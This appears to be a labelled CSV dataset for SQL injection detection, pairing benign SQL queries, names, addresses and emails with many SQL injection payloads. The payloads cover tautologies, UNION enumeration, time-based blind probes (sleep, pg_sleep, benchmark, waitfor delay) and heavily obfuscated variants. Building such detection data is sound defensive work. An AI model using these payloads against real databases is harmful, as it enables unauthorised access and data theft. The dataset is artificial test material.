Query,Label,cluster,stratify_col
"1""/**/ )   and 0x2192 =*   ( .select 0b0b0b0b10010001100001010101000000010011111010010500	from pg_sleep_( @0x5   )\   )  or false and 0xf48 in (0b1001100101111,0b111101001000,(select 0x26b9)) --",1,4,1_4
-8486%'   )    )     )   or 8571  =  8571--,1,6,1_6
select top 3 * from made where scientist = 'daughter' select * from list,0,5,0_5
"1""   )    )   ",1,4,1_4
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",1,4,1_4
1' in boolean mode  )   order by 1#,1,0,1_0
'/**/or/**/exists(select/**/1/**/from/**/users)--,1,0,1_0
"1%'   )    )    or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (   '%'  =  '",1,9,1_9
"1%""   )    )     )   union all select null,null,null,null,null,null,null#",1,4,1_4
"  select ifnull ( ""hello"", ""w3schools.com"" ) ;",0,2,0_2
"admin'/**/or/**/'1'='1#/*
*/more_noise
--o4ph4aojdbzr",1,9,1_9
select leaf ( s ) from medicine inner join,0,1,0_1
select top 50 percent * from substance select * from result fetch first 50 percent rows onlyselect top 3 * from blow,0,5,0_5
"2o0b0o4%"" + )   +)     or^ 0x05ec= ~(  select[count  ( +*;/**/)   from sysusers/*uqzgf)c4~qjgl*/as
sys6,sysusers as
sys0b76,sysusers as$sys7,sysusers as sys2,sysusers as@sys5,sysusers as(sys0b110o8x5,sysusers as sys5o3  )  and	true\or,false) and  true (and  true=and trueÃ¢Â and (select<(select (select 0x8x0b0o1))) and}true && true  ||  (select (select (select\0o0))) or (select (select (select 5784)))?<> (select
(select (selectÃ¢Â 0x1698))) and true and (select 1) or false or false and true and;1 or false --",1,2,1_2
"carrer mestre albages 61,",0,0,0_0
test' o/**/r '1'in (1)'1' /*,1,9,1_9
"   select employees.dirt, count ( orders.folksid )  as rangefrom    ( ordersinner join sunlight on orders.quicklyid  =  employees.universeid ) ",0,1,0_1
select database (  ) ,0,4,0_4
"1""  )   where 5794  =  5794 union all select null,null,null,null,null,null,null,null,null,null#",1,4,1_4
"1))/**/union select 1,database(),3--",1,4,1_4
calle regimineto del sol 48 10e,0,0,0_0
"1 where 4448  =  4448 union all select null,null,null,null,null#",1,4,1_4
select * from straw where officer between official09/01/1996since and getting15/31/1996fell,0,5,0_5
urbina granda,0,8,0_8
"insert into aboard  ( smallest, large, somehow )  values  ( 'ready', 'maybe', 'element' )  ",0,1,0_1
"-7743"" or 9323  =  9323#",1,6,1_6
"1'   )    )   and  (  select 0x2*  (	 if  \(>  (  	select * from [ (  select<concat  ( =0x0b0b0x7171708a71,  (  select   (  elt  (  0xd9b=0xd9c,(select (select (select`(select (select (select (select (select (select 1)))))))))   )<   )     )  ,0x917a0b1011111119a71,0x0o116, Ã¢Â )    )   s /*)(w'[/(*/)  , (select (select (select 0x7538dcfb7617fffa))), (select`0x7538b89a0x3c4d7ffa),  )    )     )  & and     (/*)uxo!{e5??u*/   (  $'kqip' like 'kqip",1,4,1_4
'/*!*/or exists(select 1 from users) or (1)----w7xqidmw,1,4,1_4
"   select nearby, surrounded, snakefrom development where hand  is not null",0,1,0_1
"   select employees.oldest, count ( orders.wholeid )  as racefrom    ( ordersinner join close on orders.chanceid  =  employees.scaleid ) ",0,1,0_1
"7o4'/*(select 0o0o8x0b0x515)?g>y0o10u`xd~(select?0x4)^(select((select!2x6))vt}ex}aztu<;vi&;o((select 0x0)}9frhp8&o*/  )   ),?Ã¢Â   )     or  *6x0b0xa8b(like  ;( 	select count>:(  *  )   from sysusers`as$sys4b3b1010o0o0o5o9,sysusers/as sys8,sysusers&as[sys4o0o0o5,sysusers as or+(select 0x0) and """" not like ""Ã¢Â l"" or false or false#sys0b0b0,sysusers`as sys0o4,sysusers/as&sys0o7,sysusers as sys0o8~ )    and`&   (    (_/   (:'gucd' ?like  'gucdo0x0pc=?s not  like  ",1,9,1_9
1'+  (  select yjyp where 9696  =  9696,1,6,1_6
" select * from users where id  =  1 union select !<@,version  (    )   -- 1",1,5,1_5
"-2028'   )    )     )   union all select 8698,8698,8698,8698#",1,4,1_4
"' union select null, null, null -- ",1,4,1_4
" (  select   (  case""when   (/ (select 0x1aca)  like  0xb32 	)   then (select 3838) else 0b0x1/  (  select (select (select 0))  ) 	 end  -)  Ã¢Â  ) ",1,4,1_4
"1""   )    )     )   and 9198  =  9198--",1,6,1_6
select were ( s ) from snake inner join,0,1,0_1
"0b2b7o0o0b81b100 and&user_name
`(,   )
/*(`(*/ Ã¢Â [= 
Ã¢Â 'dbo'",1,2,1_2
select * from yellow where fill between neighborhood09/01/1996free and than15/31/1996they,0,5,0_5
select min ( compound )  as underline from crowd,0,1,0_1
' or exists(select 1 from users)----o8pjziijszmza,1,4,1_4
"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",1,4,1_4
envaronar,0,8,0_8
"1%""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,1,4,1_4
select avg ( price ) from detail,0,1,0_1
meggy,0,8,0_8
22011041h,0,3,0_3
select * from north where metal between '1996-07-01' and '1996-07-31',0,5,0_5
'/*!*/or '1'='1#wu40urm,1,9,1_9
"1  )   union all select null,null,null,null,null,null,null--",1,4,1_4
 or 1  =  1 or ''  =  ',1,6,1_6
bonfiglio cabanas,0,8,0_8
"5Ã¢Â +)  {where
0x1fe4=0o4o42520 =or.4x0b1024181f*	=' ; (=!select count`Ã¢Â (
{*
%)(?/*;wpt0b0o1rkgy_g10x6xp!(select (select (select 4x5)))!+4r*/from@rdb$fields%as<t0o0b0o1,rdb$types as t3b10,rdb$collations;as;t0x4,rdb$functions'as""t0x0x4

)
;--",1,2,1_2
96399738e,0,3,0_3
"-3555'  )   or make_set  (  9354  =  9354,7185  )   and   (  'papr'  =  'papr",1,9,1_9
" select * from users where id=(select (select 2)) or (select (select 1)) or false#"".@union select null,version$ (    )   -- 7",1,4,1_4
"  select * from consonant where follow in  ( 'opinion', 'copy', 'lunch' )  ",0,5,0_5
15lo956i1o,0,3,0_3
"1%' union all select null,null,null,null,null,null,null,null,null#",1,4,1_4
" select * from telephone order by funny, sent",0,7,0_7
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,1,1_1
"1) union select 1,database(),3-- -- random_noise",1,4,1_4
select * from folks where activity in  ( select frozen from did ) ,0,7,0_7
select min ( practice )  as airplane from well,0,1,0_1
3578,0,3,0_3
"1'];)}
,where.0x0x0b1101010000_[='$0x0o4119",1,0,1_0
-2817%'  )   or 8255  =  3841--,1,6,1_6
test'	or	'1' = '1'	/*,1,9,1_9
"-3462   )    )    as biyl where 5143  =  5143 union all select 5143,5143,5143--",1,6,1_6
1'+  (  select onzd where 8452  =  8452 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   +',1,9,1_9
select * from future fetch first 50 percent rows only,0,0,0_0
"-8810'  )   or make_set  (  9354  =  9354,7185  )   and   (  'prsn' like 'prsn",1,9,1_9
"0o0o2""where(select^6x5be5)\/*f]bu|orwg""'4@m5lxsp*/=>0o2025",1,2,1_2
"call regexp_substring ~(  repeat  (  right{ (  char  (/*nkj`x*/ 0b0b0b110100111101111110011101100101101110001011011111010101110110011000011011001111100110000111101111101101100100001111011110 &)&(,0x0o0  )+.,(select 0x1dcd0b1010001011e)  )~ ,null  )  
and   (  'xcnj'   like  'xcnj",1,4,1_4
delete from breeze where magic = 'money',0,5,0_5
select * from hour,0,5,0_5
select * from married,0,5,0_5
"1) union select 1,database(),3 xor 'b'='b'--",1,0,1_0
1			and			1  =	1			or			(1),1,6,1_6
test' or '1' =	'1' /*,1,9,1_9
"!end*>Ã¢Â and/:%""mdje""+like/*.*o.m;rc-eixn{f<0o0b0b0o11hm0o11ve-j_u0l*/""mdje",1,2,1_2
select avg ( price ) from carry,0,1,0_1
"-2046'  )   union all select 6668,6668--",1,6,1_6
"%u0027%u0020and%u00201/**//**/=	convert(int,@@version)--",1,0,1_0
select avg ( stomach ) from another select sum ( layers ) ,0,1,0_1
"2',and/*i\k)fgn*nw*/0x0o0b0x40a0b1071=(select((select (select+(select<(select 2894))))) and	'qoyw'_=_	'qoyw",1,9,1_9
"catalanes, 137, 3?a",0,4,0_4
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1,4,1_4
"0o8""  )   as vpna where""0x1554  like  (select:0x1eaa) or char  (  0x54  )   or char `(  0b0x4d  )`  or char- (  (select 0x0x5f)  )   or char  (  (select 0o123)  ) 	  like@~regexp_substring  ( !repeat$(| left  (  crypt_key  (  char/*bjqc-[|tqnr"",jvxp0b0o1&v[-[*/ (  (select'15)  )  'or'char, (  (select (select (select (select (select 69)))))[ )   or char_ (  (select 81)  )  ,null {)  ,(select 0x3b100)  )  ,3x1dcd6501  )  ,null  ) `and (select 9757) not like (select 0x2704) or ""d""=""d""""  or  (select=0)	or ""y""=""yj"" or false and (select (select 1664))<>(select (select 1625)) or;(select 8726)<>(select (select$(select 8720))) and ""n_;""<>""n_;!""  or  (select 0) --",1,4,1_4
spencer,0,8,0_8
-2625'   )    )    or 3038  =  3038,1,6,1_6
select * from baby where smaller = 'treated' fetch first 3 rows only,0,5,0_5
"4o1'/ )  *( ~   and  , ! ?8x80d0b111= [~(; selectcount? (.*  ) < from^generate_series [(Ã¢Â }8x0b101x0,(select 0x3c0o0o0o1b0b0a)  {)& ./)?   and/*(select 0x0o10)`?dz>pz	qc$:ronz*/ .( !'pgyl'(})like {'pgyl",1,9,1_9
select count ( led )  from diagram,0,1,0_1
select top 3 * from spider where hunt = 'high',0,5,0_5
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""mofa"" like ""mofa",1,4,1_4
"select dbms_pipe.receive_message>/*0x7.(select (select (select (select 6))))*/(_ chr  (  (select 6x44) ){ ||chr  (  0x33)&)   *or  chr  ( 
0x2f  ) Ã¢Â   or  chr! (, 0b8o4152375  )  ,(select](select 0x5))) )]  from dual--",1,2,1_2
or 1  =  1 --,1,6,1_6
select * from sit fetch first 3 rows only select top 50 percent * from apart,0,5,0_5
; select pg_sleep(5); --,1,0,1_0
"1',  (
 select   (  case when   (]:8609  like  0x649  )   then waitfor delay '0:(select (select (select (select 8)))):5' else (select 1609)*  (  select 4x649'from master..sysdatabases  ) 
 end	  )    )   ",1,4,1_4
"1'  )   as gxpb where 7107  =  7107 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,4,1_4
delete from beauty,0,7,0_7
kangning,0,8,0_8
"calle santa teresa, 87 5?b",0,0,0_0
select * from realize where successful not like 'when%',0,7,0_7
aitor,0,8,0_8
adolphe,0,8,0_8
hymen_israeli@aulahost.vc,0,0,0_0
test'		or		'1' = '1'		/*,1,9,1_9
select min ( safety )  as ancient from present,0,1,0_1
"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",1,4,1_4
select * from women where bowl = 'near'  or sea = 'ship',0,5,0_5
select * from news where globe = 'month'  or needed = 'throat',0,5,0_5
lacruz morey,0,8,0_8
"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""jbty"" like ""jbty",1,4,1_4
"1)) union select 1,database(),3--#kxhem",1,4,1_4
"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",1,4,1_4
"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",1,0,1_0
"0o1"" where (select (select0x871))=(select (select (select 4168))) and:0o0b1111111010104 ;=; like  (  'abcdefg',upper  (hex~ (  randomblob ;(  (select (select 510900800))/0o0b0x1 / or false#)    )    ` )    )   and ""0o0x0b101"" not like ""0o9&"" or ""$"" not like ""$"" or (select/**/(select (select 0)))  or  false and 1 or 423!=(select (select 423)) --0$y}`ic",1,4,1_4
'/*!*/or '1'='1--7bytz7fn9i,1,9,1_9
49339665l,0,3,0_3
"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""vhey""  =  ""vhey",1,4,1_4
42141,0,3,0_3
"@var/*;tl4?w\mhr0b101,<ok*/select|@var&as`var,into}temp
end}--",1,0,1_0
"   select employees.cat, count ( orders.doorid )  as newspaperfrom    ( ordersinner join hand on orders.droveid  =  employees.fartherid ) ",0,1,0_1
test'    or    '1'	like '1'    /*,1,9,1_9
"-3872%""   )    )     )   union all select 1637,1637,1637,1637,1637#",1,4,1_4
"1'   )    )     )   union all select null,null,null,null--",1,4,1_4
select nuts ( s ) from else inner join,0,1,0_1
" select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1,5,1_5
"1'  )   where 1625  =  1625 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
"0x2x8b1' where 7b0x0b101010a0o2x0x4(]like =(select (select 0x0x16a5)) and (select (select 0x2078))  like;dbms_pipe.receive_message  (  chr""]( ,64'!):  or chr  (  (select 0x4f) ) ? or chr  (  0x0b3107101\@) ; or chr /(  0x0x29  )  or 0x3x0  and  ""?qw""not like ""^qwl"",and ""e""=""e"" or'falseor false  or or_false or false:&&|true or?false or false or false or false&&(select 1)# falseandtrue#,0b801  )  or:false --7j5qu_ea-e""-(select (select 0x3))?
cqal}",1,2,1_2
"1""  )   where 8657  =  8657",1,6,1_6
"1' in boolean mode  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   #",1,4,1_4
"'    and    extractvalue(1,concat(0x5c,version()))--",1,0,1_0
"iif}	(&0o0b1110100000111/**/=\&0xbcd,0o0x1,(select_7x1)/(select<(select&(select+0))). )_&",1,4,1_4
"1'/**/or/**/if(substring(database(),/**/1,/**/1)='a',/**/sleep(5),/**/0)/**/--",1,0,1_0
"1%""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""%""  =  """,1,1,1_1
"-4679 where 9634  =  9634 union all select 9634,9634,9634,9634,9634,9634,9634--",1,4,1_4
select top 3 * from news where form = 'upon',0,5,0_5
"1%' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",1,9,1_9
"0o0b0o1'  ) >    and   
> (  0o0b0o0b0b1111101000x0b0o7302406113~`  like;   (select (select)(select 7892)))$~)  *(select (select (select (select 0x1e7a))))and}; ( %'kkok' like''kkok",1,9,1_9
sitiwet-chagas@creacionesacampada.travel,0,0,0_0
'/**/or/**/1> = 1/**//**/--/**/random_noise--/**/,1,0,1_0
"   select locate,suit,material,nearer,fall     (  (  or join halfway on signal.image =  am.write )   inner join favoriteon orders.is =  these.thinkid ) ",0,1,0_1
select two from snake union select describe from gun order by here,0,7,0_7
select * from language fetch first 3 rows only,0,0,0_0
select avg ( pattern ) from pink select sum ( soon ) ,0,1,0_1
" select * from*users where_id  Ã¢Â like   0o7x0o0x6)or 0x0b110<or false/*a
	sp*/and_true#"".<union select
0o5o1,version ~(* ; );  -- (select 3x7)/7t7",1,2,1_2
"1%"" waitfor delay '0:0:5'--",1,0,1_0
"   select count ( fish ) , death from natural by grown",0,1,0_1
43511,0,3,0_3
1b0b3o1'  ) 'and0x6x1o2b0x8b0x0o0b111b4 	 ?like   !/*a0b0o156	a; 0x1f~	{Ã¢Â u*/ ( ?select?(select (select 1x0x0x0o7b1b47)) from]pg_sleep ;(  0x5;	 )`/*0x0x12?avjcijq>at j*/  )/   and}/*=gvhhr?y	e0o3*/ (  'nqol'`[like  'nqol,1,2,1_2
48710,0,3,0_3
"calle andres mellado, 83, 12-d",0,0,0_0
"cerollera, la",0,1,0_1
select stared ( s )  from swung union,0,1,0_1
select * from pound,0,5,0_5
"1))union/*
*/select",1,4,1_4
"1'/**/xor/**/if(substring(database(),/**/1,/**/1)='a',/**/sleep(5),/**/0)/**//**/&&/**/(1=1)'a'='a'--",1,9,1_9
"3""   )    )`   /*m6y|?/ yc*/)   or elt  (  0xebd  like  (select 0o0b1021011110008),sleep  ( ](select 0o1)  \)    )$   or  false or 'c]' not  = &'c]')orÃ¢Â (select]0x0) or (select (select+(select 9052))) not like (select (select (select (select 9352))))-or(0x24f5Ã¢Â not  like_ (select 0o0x576d) and#true or false#w6` rv",1,2,1_2
"%u0027/**/and/**/extractvalue(1,concat(0x5c,version()))--",1,0,1_0
select avg ( theory ) from none,0,1,0_1
quilley0@frenchpolynesia.com.st,0,0,0_0
atrazar,0,8,0_8
"-7700%'  )   union all select 5660,5660,5660,5660,5660,5660,5660,5660,5660#",1,4,1_4
6052580000000000,0,3,0_3
19127,0,3,0_3
test' or '1'='1' --,1,9,1_9
"0o10'+  (  select 'vbqo'
where{0b0xeb0b10f505fc6=0x15fe_procedure analyse] ($ extractvalue,;(  (select 0o16713),concat  (? 0x5c,  ( $benchmark^
(  (select 0x4d6f96),md5  (  0x4b774c75^  ) {  )   $  )/*j5jj1<@(select 1x8);~<*/ ~	)/**/  
 ) [,0x1  ) -  or  (select (select (select (select (select 1622))))) not like 0b1011501011010 or\false or false and ""2b"" not  like  ""2b@""#q$+ke+fp&3s0",1,4,1_4
breanne,0,8,0_8
"3b1'^in boolean mode )  [and (select (select (select (select (select 7778))))) like{dbms_utility.sqlid_to_sqlhash }^(    (   chr  (  0b0x41  )   or chr  (@ 6x71  )^  or chr  (  112"" )   or chr -(  0x2c0o6$ )  ||chr  (  0x71  )/**/ or  (; select  !( ,case when,  (  0x1e2c=0b0x2e0o3x0b100c  )@  then (select (select (select 0x0x1))) else((select (select 0x8))
end  )   from dual  )   or chr  (  (select 0o961)  )  ||chr  (  (select 0b1111010)  )   or chr  (  (select (select (select (select 118))))  )   or chr  (  (select (select 127)){>)  ||chr  (  (select4b1107001) /*tyjeu/ww6<(select 0x3)$;s*/ )  "" )     )  	and true||false or false/*r5n-*/and true or false	or (select (select 0)) or false or 0x9&&(select (select 1)) and('x' not ]like !'x6'{and true and true   &&   (select (select (select (select 1)))) and true  &&  8 and 1||'e[cw?'<>'e[cw?'#`s7abnjien%o*+j9tukt=%""+gh",1,9,1_9
"1%"" and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and ""%""  =  """,1,2,1_2
"-1030"" where 2161  =  2161 union all select 2161,2161,2161,2161,2161,2161,2161,2161,2161,2161--",1,4,1_4
"1'  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'efwq' like 'efwq",1,9,1_9
-2951 or 4189  =  2291,1,6,1_6
select * from welcome where atom = 'load' limit 3,0,5,0_5
"  select definition,off,opportunity from beneath left join orders on cold.appleid =  surface.attempt order by evening.trap",0,1,0_1
"1' in boolean mode  )   and make_set  (  8403  =  8403,8899  )  #",1,4,1_4
"  select suddenly,chair,escape from chosen left join orders on potatoes.establishid =  steep.people order by beat.flow",0,1,0_1
select * from compare where journey = 'improve'  and city = 'trick',0,5,0_5
"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",1,4,1_4
"1]{)
* as
iupg where(select 8b0b0b104100101101)  like^<(select 0b1x0xb0d)[or (select 0b0x4x0b0o14102751b)   =   "" ( select'count ^([ *  )  ^from sysusers as sys6,sysusers as""sys4,sysusers@as^sys7,sysusers as sys5,sysusers!as sys5,sysusers<as sys6,sysusers!as sys6x7  )  and$true and 0x139a  like =(select 0x0o0x0o0xcca),and true(or?7o0x0o0  or  (select (select (select?0x0))) or	false
and true+and (select (select 0x0o1)) or/*j*/0x1?or false`or (select=(select,(select (select 2051)))) like (select (select|(select (select (select=2062))))) and true and
true and`""yq"" not like ""yq("" and true%or false or false --",1,4,1_4
